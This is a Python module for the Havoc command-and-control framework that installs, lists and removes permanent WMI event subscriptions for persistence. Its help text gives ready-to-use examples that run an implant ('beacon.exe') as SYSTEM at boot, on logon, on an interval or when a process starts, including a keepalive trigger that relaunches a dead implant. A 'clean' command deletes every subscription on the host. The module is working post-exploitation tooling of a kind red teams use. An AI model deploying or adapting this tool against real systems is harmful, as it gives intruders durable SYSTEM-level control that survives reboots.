"""
WmiSubscriptions — WMI Event Subscription persistence (T1546.003).

Installs a *permanent* WMI event subscription (CommandLineEventConsumer +
__EventFilter + __FilterToConsumerBinding) on the local host so a command
fires automatically whenever the chosen trigger occurs. Survives reboots.

Registered as a MODULE with per-subcommand commands (list / create /
remove / clean). The full annotated guide (with a worked example for every
parameter and trigger) lives in MODULE_DESCRIPTION so it renders on the
native `help wmisubs` command.

Triggers (resolved to WQL here, so the BOF just gets the final query):
    startup          : fires a few minutes after boot (via perf-counter mutation)
    logon            : fires on each interactive logon
    process:<exe>    : fires when a specific process starts
    interval:<sec>   : fires on a fixed interval (uses __IntervalTimerInstruction)
    wql:"<query>"    : raw custom WQL

Wire (all strings are UTF-16LE via addWstr):
    list   : int 0
    create : int 1, wstr name, wstr cmdline, wstr query, wstr timerId, int intervalMs, wstr namespace
    remove : int 2, wstr name, wstr timerId
    clean  : int 3
"""

from havoc import Demon, RegisterCommand, RegisterModule

BOF_PATH = "bin/wmisubscriptions.x64.o"

MODE_LIST   = 0
MODE_CREATE = 1
MODE_REMOVE = 2
MODE_CLEAN  = 3

# Standard WMI persistence queries.
QUERY_STARTUP = (
    "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
    "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
    "AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
)
QUERY_KEEPALIVE = (
    "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
    "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
    "AND TargetInstance.SystemUpTime >= 120"
)
QUERY_LOGON = (
    "SELECT * FROM __InstanceCreationEvent WITHIN 15 "
    "WHERE TargetInstance ISA 'Win32_LogonSession'"
)

# WMI event namespaces. The subscription objects live in root\subscription,
# but the events we watch (perf counters, logon sessions, process starts)
# live in root\cimv2 — the __EventFilter MUST set EventNamespace accordingly
# or the query never matches (this was the no-callback bug).
NS_CIMV2        = "root\\cimv2"
NS_SUBSCRIPTION = "root\\subscription"

# Full annotated guide. Rendered verbatim by the native `help wmisubs`
# (Havoc's help prints Module.Description line-for-line). Keep every line
# short so nothing wraps awkwardly in the console.
MODULE_DESCRIPTION = "\n".join([
    "WMI Event Subscription persistence (T1546.003)",
    "Installs a permanent subscription in root\\subscription so a command runs",
    "automatically when a trigger fires. Survives reboots; runs as SYSTEM.",
    "",
    "COMMANDS",
    "  list            list all subscription components (filters, consumers, bindings, timers)",
    "  create          install a subscription (re-running the same <name> overwrites it)",
    "  remove          delete a named subscription",
    "  clean           delete ALL subscriptions (including ones you did not create)",
    "",
    "TRIGGERS  (--trigger <t>)",
    "  startup         fires a few minutes after boot (perf-counter SystemUpTime window)",
    "                  ex: wmisubs create Boot \"cmd.exe /c C:\\tmp\\beacon.exe\" --trigger startup",
    "  keepalive       fires repeatedly after ~2 min; relaunches the exe if it dies",
    "                  ex: wmisubs create Keep \"C:\\tmp\\beacon.exe\" --trigger keepalive",
    "  logon           fires on each interactive logon (Win32_LogonSession)",
    "                  ex: wmisubs create Logon \"C:\\tmp\\beacon.exe\" --trigger logon",
    "  process:<exe>   fires when <exe> starts (Win32_ProcessStartTrace)",
    "                  ex: wmisubs create Watch \"cmd.exe /c whoami > C:\\tmp\\who.txt\" --trigger process:notepad.exe",
    "  interval:<sec>  fires every <sec> seconds (min 5) via __IntervalTimerInstruction",
    "                  ex: wmisubs create Poll \"C:\\tmp\\beacon.exe\" --trigger interval:60",
    "  wql:\"<query>\"    raw custom WQL query",
    "                  ex: wmisubs create Custom \"C:\\tmp\\beacon.exe\" --trigger wql:\"SELECT * FROM",
    "                     __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'\"",
    "",
    "PARAMETERS",
    "  <name>       subscription name (unique; links filter + consumer + binding)",
    "               ex: Updater",
    "  <command>    command line run as SYSTEM when the trigger fires (quote if spaces)",
    "               ex: \"cmd.exe /c C:\\tmp\\beacon.exe\"",
    "  --trigger    which event fires the command (see TRIGGERS above)",
    "  --timer-id   (interval: only) custom timer id; defaults to <name>_timer",
    "               ex: --timer-id PollT",
    "  --interval   (interval: only) override the period in seconds",
    "               ex: --interval 120",
    "  --namespace  override the event namespace (default: root\\cimv2 for",
    "               startup/keepalive/logon/process/wql; root\\subscription for interval)",
    "",
    "REMOVE EXAMPLES",
    "  wmisubs remove Updater",
    "  wmisubs remove Poll --timer-id PollT",
    "",
    "OPSEC",
    "  Subscriptions are visible to defenders and logged in the WMI-Activity",
    "  operational log (Event ID 5861). Remove them when done.",
])

MODULE_USAGE = (
    "list | create <name> <command> --trigger <t> | remove <name> [--timer-id <id>] | clean"
)

MODULE_EXAMPLE = 'create Updater "cmd.exe /c C:\\tmp\\beacon.exe" --trigger startup'


def _resolve_trigger(demon, spec):
    """Resolve a --trigger argument to (query, timer_id, interval_ms, namespace)."""
    spec = spec or ""
    low = spec.lower()

    if low == "startup":
        return QUERY_STARTUP, "", 0, NS_CIMV2

    if low == "keepalive":
        return QUERY_KEEPALIVE, "", 0, NS_CIMV2

    if low == "logon":
        return QUERY_LOGON, "", 0, NS_CIMV2

    if low.startswith("process:"):
        exe = spec[len("process:"):].strip()
        if not exe:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "process: trigger needs an executable name")
            return None
        query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = '%s'" % exe
        return query, "", 0, NS_CIMV2

    if low.startswith("interval:"):
        secs_str = spec[len("interval:"):].strip()
        try:
            secs = int(secs_str)
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "interval: trigger needs an integer number of seconds")
            return None
        if secs < 5:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "interval must be >= 5 seconds")
            return None
        # Marker query + ms in interval_ms slot; the caller builds the real
        # query around a timer id. Interval timer events fire in the
        # subscription namespace itself.
        return ("__INTERVAL_PLACEHOLDER__", "", secs * 1000, NS_SUBSCRIPTION)

    if low.startswith("wql:"):
        # strip leading wql: and one optional pair of surrounding quotes
        q = spec[len("wql:"):].strip()
        if len(q) >= 2 and q[0] == '"' and q[-1] == '"':
            q = q[1:-1]
        if not q:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "wql: trigger needs a query")
            return None
        return q, "", 0, NS_CIMV2

    demon.ConsoleWrite(
        demon.CONSOLE_ERROR,
        "Unknown trigger '%s'. Use startup, keepalive, logon, process:<exe>, interval:<sec>, or wql:\"<query>\""
        % spec)
    return None


# ---------------------------------------------------------------------------
# Subcommand handlers. Each receives (demonID, *params) where params are the
# tokens AFTER the subcommand name.
# ---------------------------------------------------------------------------

def _cmd_list(demonID, *params):
    demon  = Demon(demonID)
    packer = Packer()
    packer.addint(MODE_LIST)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
                                "Tasked demon to list WMI event subscriptions")
    demon.InlineExecute(TaskID, "go", BOF_PATH, packer.getbuffer(), False)
    return TaskID


def _cmd_clean(demonID, *params):
    demon  = Demon(demonID)
    packer = Packer()
    packer.addint(MODE_CLEAN)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
                                "Tasked demon to remove ALL WMI event subscriptions")
    demon.InlineExecute(TaskID, "go", BOF_PATH, packer.getbuffer(), False)
    return TaskID


def _cmd_create(demonID, *params):
    demon = Demon(demonID)

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "wmisubs BOF is x64-only")
        return False

    if len(params) < 2:
        demon.ConsoleWrite(
            demon.CONSOLE_ERROR,
            "Usage: wmisubs create <name> <command> --trigger startup|logon|process:<exe>|interval:<sec>|wql:\"<query>\" [--timer-id <id>] [--interval <sec>]")
        return False

    name    = params[0]
    command = params[1]

    trigger = None
    timer_id = None
    interval_override = None
    namespace_override = None
    i = 2
    while i < len(params):
        a = params[i]
        if a == "--trigger" and i + 1 < len(params):
            trigger = params[i + 1]
            i += 2
            continue
        if a == "--timer-id" and i + 1 < len(params):
            timer_id = params[i + 1]
            i += 2
            continue
        if a == "--interval" and i + 1 < len(params):
            try:
                interval_override = int(params[i + 1])
            except ValueError:
                demon.ConsoleWrite(demon.CONSOLE_ERROR, "--interval needs an integer (seconds)")
                return False
            i += 2
            continue
        if a == "--namespace" and i + 1 < len(params):
            namespace_override = params[i + 1]
            i += 2
            continue
        if a.startswith("--trigger"):
            trigger = params[i + 1] if i + 1 < len(params) else None
            i += 2
            continue
        # bare token: assume it is the trigger spec (backward-compat shorthand)
        trigger = a
        i += 1

    if trigger is None:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Missing --trigger (startup|keepalive|logon|process:<exe>|interval:<sec>|wql:\"<query>\")")
        return False

    resolved = _resolve_trigger(demon, trigger)
    if resolved is None:
        return False

    query, t_id, interval_ms, namespace = resolved

    # interval trigger: need a timer id and query built around it
    if query == "__INTERVAL_PLACEHOLDER__":
        timer_id = timer_id or (name + "_timer")
        query = 'SELECT * FROM __TimerEvent WHERE TimerId="%s"' % timer_id
        if interval_override is not None:
            interval_ms = interval_override * 1000
    else:
        timer_id = timer_id or t_id or ""
        interval_ms = interval_override if interval_override is not None else interval_ms

    if namespace_override:
        namespace = namespace_override

    packer = Packer()
    packer.addint(MODE_CREATE)
    packer.addWstr(name)
    packer.addWstr(command)
    packer.addWstr(query)
    packer.addWstr(timer_id)
    packer.addint(interval_ms)
    packer.addWstr(namespace)

    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK,
        "Tasked demon to create WMI event subscription '%s'" % name)
    demon.InlineExecute(TaskID, "go", BOF_PATH, packer.getbuffer(), False)
    return TaskID


def _cmd_remove(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: wmisubs remove <name> [--timer-id <id>]")
        return False

    name = params[0]
    timer_id = ""
    i = 1
    while i < len(params):
        a = params[i]
        if a == "--timer-id" and i + 1 < len(params):
            timer_id = params[i + 1]
            i += 2
            continue
        # allow remove <name> <timerid> shorthand
        timer_id = a
        i += 1

    packer = Packer()
    packer.addint(MODE_REMOVE)
    packer.addWstr(name)
    packer.addWstr(timer_id)

    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK,
        "Tasked demon to remove WMI event subscription '%s'" % name)
    demon.InlineExecute(TaskID, "go", BOF_PATH, packer.getbuffer(), False)
    return TaskID


# ---------------------------------------------------------------------------
# Registration — module + one command per subcommand.
# ---------------------------------------------------------------------------

RegisterModule(
    "wmisubs",
    MODULE_DESCRIPTION,
    "",
    MODULE_USAGE,
    MODULE_EXAMPLE,
    "",
)

RegisterCommand(
    _cmd_list,
    "wmisubs",
    "list",
    "List all WMI event subscription components (filters, consumers, bindings, timers)",
    0,
    "",
    "",
)

RegisterCommand(
    _cmd_create,
    "wmisubs",
    "create",
    "Install a permanent subscription that runs a command as SYSTEM on a trigger",
    0,
    "<name> <command> --trigger startup|logon|process:<exe>|interval:<sec>|wql:\"<query>\" [--timer-id <id>] [--interval <sec>]",
    'Updater "cmd.exe /c C:\\tmp\\beacon.exe" --trigger startup',
)

RegisterCommand(
    _cmd_remove,
    "wmisubs",
    "remove",
    "Delete a named subscription (binding + consumer + filter [+ timer])",
    0,
    "<name> [--timer-id <id>]",
    "Updater",
)

RegisterCommand(
    _cmd_clean,
    "wmisubs",
    "clean",
    "Delete ALL WMI event subscriptions (every instance in all five classes)",
    0,
    "",
    "",
)
